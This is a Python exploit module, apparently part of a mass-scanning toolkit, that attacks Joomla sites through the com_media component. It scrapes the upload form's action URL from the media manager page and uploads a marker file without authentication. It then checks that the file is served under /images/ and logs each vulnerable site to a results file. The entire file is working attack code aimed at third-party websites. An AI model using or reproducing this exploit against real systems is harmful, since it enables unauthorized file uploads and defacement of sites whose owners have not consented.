# coding=utf-8
import requests, re
import printModule

TextindeX = 'files/neko.txt'

def Exploit(site):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0'}
    sess = requests.session()
    try:
        GET = sess.get('http://' + site + '/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name='
                                          'jform_articletext&asset=com_content&author=&folder=',
                       timeout=10, headers=headers)
        if 'task=file.upload' in str(GET.content):
            try:
                Uploader = re.findall('action="(.*)" id="uploadForm"', str(GET.content))[0]
                if Uploader.startswith("http://"):
                    Uploader = Uploader.replace("http://", "")
                elif Uploader.startswith("https://"):
                    Uploader = Uploader.replace("https://", "")
                else:
                    pass
                POSTDATA = {'Filedata[]': open(TextindeX, 'rb')}
                sess.post('http://' + Uploader, files=POSTDATA, headers=headers, timeout=10)
                CheckIndex = requests.get('http://' + site + '/images/neko.txt', timeout=10,
                                          headers=headers).content
                if 'neko!!' in str(CheckIndex):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/images/neko.txt\n')
                    return printModule.returnYes(site, 'N/A', 'Com_Media', 'Joomla')
                else:
                    return printModule.returnNo(site, 'N/A', 'Com_Media', 'Joomla')
            except:
                return printModule.returnNo(site, 'N/A', 'Com_Media', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_Media', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_Media', 'Joomla')
